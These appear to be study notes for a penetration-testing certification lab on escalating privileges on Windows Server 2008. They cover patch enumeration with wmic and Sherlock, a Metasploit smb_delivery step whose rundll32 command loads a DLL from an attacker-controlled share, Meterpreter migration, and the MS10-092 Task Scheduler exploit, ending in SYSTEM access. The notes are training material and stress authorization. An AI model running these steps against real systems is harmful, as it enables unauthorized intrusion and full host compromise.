This section is the practical continuation of **Legacy Operating Systems**. The main theme is that Server 2008 lacks several security protections present in newer Windows Server versions, so **old patch levels + old security architecture + known LPEs** can create very different attack paths.

---

# 1. Windows Server 2008 / 2008 R2

Windows Server 2008 and 2008 R2 reached **end of life on January 14, 2020**. The source notes that Server 2008 is less common during external tests but is still encountered during internal assessments.

For CPTS, immediately think:

```text
Server 2008 / 2008 R2
        │
        ├── EOL
        ├── Older security controls
        ├── Potentially missing patches
        ├── Legacy services
        └── Historical LPE/RCE vulnerabilities
```

---

# 2. Server 2008 vs Newer Windows

One of the most important things to understand is that **security capabilities evolved over Windows generations**.

The source compares Server 2008 R2, Server 2012 R2, Server 2016, and Server 2019.

|Security feature|2008 R2|2012 R2|2016|2019|
|---|--:|--:|--:|--:|
|Enhanced Windows Defender ATP|—|—|—|✓|
|Just Enough Administration|Partial|Partial|✓|✓|
|Credential Guard|—|—|✓|✓|
|Remote Credential Guard|—|—|✓|✓|
|Device Guard / Code Integrity|—|—|✓|✓|
|AppLocker|Partial|✓|✓|✓|
|Windows Defender|Partial|Partial|✓|✓|
|Control Flow Guard|—|—|✓|✓|

### CPTS takeaway

When you see an old OS, don't assume modern mitigations exist.

For example:

```text
Modern Server
      ↓
More security controls
      ↓
More exploit mitigations

Server 2008
      ↓
Older security architecture
      ↓
Potentially fewer barriers
```

The source specifically identifies Credential Guard, Device Guard, Control Flow Guard, Remote Credential Guard, and newer Defender capabilities as later additions.

---

# 3. Business Context Comes Before Exploitation

This is an **extremely important professional pentesting lesson**.

Legacy systems can be:

```text
Forgotten server
       OR
Mission-critical server
```

You need to determine which one you're dealing with.

The source gives a medical-environment example where an old Windows system may be running expensive MRI software that the vendor no longer supports. Simply telling the client to remove the machine isn't necessarily a practical recommendation.

Possible compensating controls include:

- Network segmentation
    
- Custom/extended Microsoft support
    
- Other environmental controls
    

### CPTS reporting mindset

Don't write:

> "Remove this server immediately."

without understanding:

```text
Why does it exist?
What does it run?
What depends on it?
Can it be upgraded?
Can it be isolated?
What compensating controls exist?
```

---

# 4. Forgotten vs Critical Legacy Hosts

### Scenario A — Forgotten Server

```text
Modern environment
       ↓
One Server 2008 host
       ↓
Nobody uses it
       ↓
Recommendation:
Upgrade / decommission
```

The source notes this can also be particularly important in environments subject to stringent audit/regulatory requirements. A legacy system can negatively affect an organization's audit standing.

### Scenario B — Mission-Critical Server

```text
Server 2008
     ↓
Critical application
     ↓
Cannot upgrade immediately
     ↓
Segmentation / compensating controls
```

The recommendation depends on the **business context**, not simply the age of the OS.

---

# 5. Patch Enumeration on Server 2008

Now we get into the actual CPTS workflow.

For an older OS such as Server 2008, the source recommends tools such as:

### Sherlock

Used to identify missing patches and potential local vulnerabilities.

### Windows-Exploit-Suggester

It takes `systeminfo` output and compares the host's patch level against Microsoft's vulnerability information to identify potential missing patches. It can also suggest Metasploit modules when applicable.

### Manual enumeration

Sometimes tools cannot be loaded onto the target.

Then:

```text
Enumerate manually
        ↓
Record patch level
        ↓
Research applicable vulnerabilities
        ↓
Validate
```

---

# 6. Query Current Patch Level

The source uses:

```cmd
wmic qfe
```

Example:

```text
HotFixID
--------
KB2533552
```

### What is `QFE`?

Think:

```text
WMIC
 ↓
QFE
 ↓
Installed Windows hotfixes / updates
```

For CPTS, combine this with:

```cmd
systeminfo
```

and, on systems where available:

```powershell
Get-HotFix
```

The important goal is not merely collecting KB numbers—it is determining **what security patches are missing**.

---

# 7. Sherlock

The source demonstrates:

```powershell
Set-ExecutionPolicy bypass -Scope process
```

Then:

```powershell
Import-Module .\Sherlock.ps1
```

And:

```powershell
Find-AllVulns
```

Sherlock reports potential vulnerabilities and their status.

Example results include:

```text
MS10-015
MS10-092
MS13-053
MS13-081
MS14-058
MS15-051
MS15-078
MS16-016
MS16-032
MS16-034
MS16-135
```

The important field is:

```text
VulnStatus
```

which may say:

```text
Appears Vulnerable
Not Vulnerable
Not supported on 64-bit systems
```

### ⭐ Important

A vulnerability scanner/suggester is **not the same as successful exploitation**.

Think:

```text
Scanner says:
"Appears Vulnerable"
        ↓
Check architecture
        ↓
Check OS/build
        ↓
Check patch
        ↓
Check exploit compatibility
        ↓
Validate
        ↓
Exploit if authorized
```

---

# 8. Example: MS10-092 Task Scheduler

The lab identifies:

```text
MS10-092
CVE-2010-3338
CVE-2010-3888
```

with the vulnerability status:

```text
Appears Vulnerable
```

This becomes the privilege-escalation candidate used later in the walkthrough.

---

# 9. Obtaining a Meterpreter Shell

The source uses Metasploit's:

```text
exploit/windows/smb/smb_delivery
```

The module can provide a DLL/PowerShell delivery mechanism.

Example configuration from the lab:

```text
SRVHOST = 10.10.14.3
SRVPORT = 445
LHOST   = 10.10.14.3
LPORT   = 4444
```

The module ultimately provides the target-side command:

```cmd
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

On the target:

```cmd
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

The lab then receives a Meterpreter session.

---

# 10. Why Architecture Matters

This is one of the **most important details in the lab**.

The initial process is:

```text
rundll32.exe
```

running as:

```text
x86
```

The process list shows:

```text
2268  rundll32.exe  x86
```

while other processes such as:

```text
taskhost.exe
powershell.exe
cmd.exe
explorer.exe
```

are running as x64.

The source explains that the privilege-escalation exploit requires migration to a **64-bit process**.

---

# 11. Meterpreter Process Migration

First interact with the session:

```text
sessions -i 1
```

Check the current PID:

```text
getpid
```

The lab shows:

```text
Current pid: 2268
```

Then inspect processes:

```text
ps
```

Find a suitable 64-bit process.

The source migrates to:

```text
PID 2796
```

using:

```text
migrate 2796
```

Then:

```text
background
```

returns to the Metasploit console.

### Mental model

```text
x86 Meterpreter
      │
      ▼
Find x64 process
      │
      ▼
migrate
      │
      ▼
x64 Meterpreter context
      │
      ▼
Run compatible LPE
```

### ⭐ CPTS lesson

**Architecture is part of exploit compatibility.**

Always know:

```text
OS architecture
+
Current process architecture
+
Exploit architecture
```

---

# 12. Search for the LPE Module

The source searches for the CVE:

```text
search 2010-3338
```

Metasploit returns:

```text
exploit/windows/local/ms10_092_schelevator
```

with:

```text
Rank: excellent
Check: Yes
```

Then:

```text
use 0
```

---

# 13. Configure the Privilege Escalation Module

Set the Meterpreter session:

```text
set SESSION 1
```

Set the callback:

```text
set lhost 10.10.14.3
set lport 4443
```

Then:

```text
show options
```

The target is explicitly listed as:

```text
Windows Vista, 7, and 2008
```

---

# 14. MS10-092 / SCHELEVATOR Attack Chain

When the module executes, the lab output shows:

```text
Preparing payload
       ↓
Creating scheduled task
       ↓
Reading task file
       ↓
Modifying task
       ↓
Validating task
       ↓
Disabling task
       ↓
Enabling task
       ↓
Executing task
       ↓
Reverse connection
       ↓
Deleting task
```

This is a great example of why understanding **Windows scheduled tasks** is important.

---

# 15. Result: SYSTEM

The resulting session:

```text
meterpreter > getuid
```

returns:

```text
Server username: NT AUTHORITY\SYSTEM
```

`sysinfo` confirms:

```text
Computer        : WINLPE-2K8
OS              : Windows 2008 R2 (6.1 Build 7600)
Architecture   : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```

Notice something interesting:

> The OS is x64, but the Meterpreter session shown is x86.

That's another reason architecture awareness matters.

---

# 🔥 Complete Attack Chain

Memorize this for CPTS:

```text
                SERVER 2008 R2
                      │
                      ▼
               Patch enumeration
                      │
            ┌─────────┴─────────┐
            ▼                   ▼
         WMIC QFE           Sherlock
            │                   │
            └─────────┬─────────┘
                      ▼
                Missing patches
                      │
                      ▼
               MS10-092 found
                      │
                      ▼
              Obtain shell
                      │
                      ▼
              Meterpreter x86
                      │
                      ▼
             Find x64 process
                      │
                      ▼
               migrate PID
                      │
                      ▼
            ms10_092_schelevator
                      │
                      ▼
             Scheduled Task LPE
                      │
                      ▼
              NT AUTHORITY\SYSTEM
```

---

# 🧠 What You Should Actually Learn

Don't memorize only:

```text
MS10-092
```

The more valuable CPTS knowledge is the **methodology**:

### Step 1 — Identify the OS

```text
systeminfo
```

### Step 2 — Determine patch level

```cmd
wmic qfe
```

### Step 3 — Use a vulnerability suggester where appropriate

```text
Sherlock
Windows-Exploit-Suggester
```

### Step 4 — Identify applicable vulnerabilities

Don't blindly trust scanner output.

### Step 5 — Check architecture

```text
x86?
x64?
```

### Step 6 — Obtain a shell appropriate to the lab

### Step 7 — Make the shell/exploit architecture compatible

For this example:

```text
x86 Meterpreter
      ↓
migrate
      ↓
x64 process
```

### Step 8 — Run the applicable LPE

### Step 9 — Verify

```text
getuid
sysinfo
```

---

# ⚠️ Important Pentesting Lesson: Legacy ≠ Safe to Exploit

The source's strongest professional lesson isn't actually the exploit.

It is **understanding the target before exploitation**.

If you encounter:

```text
Windows Server 2008
```

ask:

```text
What does this server do?

Is it production?

Is it medical infrastructure?

Is it running a critical application?

Can exploitation crash it?

Is exploitation authorized?

What compensating controls exist?
```

The source explicitly emphasizes discussing legacy systems with the client during scanning, enumeration, attacks, and reporting because the appropriate recommendation depends on the environment.

---

# 🎯 CPTS Viva Questions

### Q1. Why are Server 2008 systems interesting during a pentest?

Because they are EOL and may lack modern security protections and patches, potentially exposing them to known RCE/LPE vulnerabilities.

### Q2. What is the first thing you should enumerate for an old Windows system?

The exact:

**OS version/build + patch level + architecture.**

### Q3. What does `wmic qfe` show?

Installed Windows hotfix/update information.

### Q4. What is Sherlock used for?

To identify potential Windows vulnerabilities based on the system's configuration/patch state.

### Q5. What is Windows-Exploit-Suggester?

A tool that uses `systeminfo` output to compare the host's patch level against known Microsoft vulnerabilities and identify potential missing patches.

### Q6. Why can an exploit-suggester result not be treated as proof?

Because compatibility still depends on things such as:

- Exact OS
    
- Architecture
    
- Patch state
    
- Configuration
    
- Exploit requirements
    

### Q7. Why did the lab migrate Meterpreter?

The LPE module required a compatible **64-bit process context**, so the x86 Meterpreter process was migrated to an x64 process.

### Q8. What is `ms10_092_schelevator`?

A Metasploit local privilege-escalation module associated with the Windows Task Scheduler XML vulnerability demonstrated against Windows Vista, Windows 7, and Server 2008.

### Q9. What privilege did the lab ultimately obtain?

```text
NT AUTHORITY\SYSTEM
```

### Q10. What is the most important professional consideration when attacking a legacy server?

**Understand its business role and confirm the engagement's scope/authorization before potentially disruptive exploitation.**

---

## 🔑 Final Memory Formula

```text
LEGACY WINDOWS
      ↓
OS / BUILD
      ↓
PATCH LEVEL
      ↓
ARCHITECTURE
      ↓
VULNERABILITY ENUMERATION
      ↓
VALIDATE COMPATIBILITY
      ↓
OBTAIN SHELL
      ↓
MIGRATE IF REQUIRED
      ↓
LPE
      ↓
VERIFY SYSTEM
```

**For this HTB example specifically:**

```text
Server 2008 R2
 → WMIC QFE
 → Sherlock
 → MS10-092
 → Meterpreter
 → x86 → x64 migration
 → ms10_092_schelevator
 → SYSTEM
```

The final challenge in the section explicitly asks you to find **one or more ways** to reach `NT AUTHORITY\SYSTEM` on the Server 2008 target rather than simply reproducing the Task Scheduler technique, which is a good opportunity to practice the broader enumeration methodology.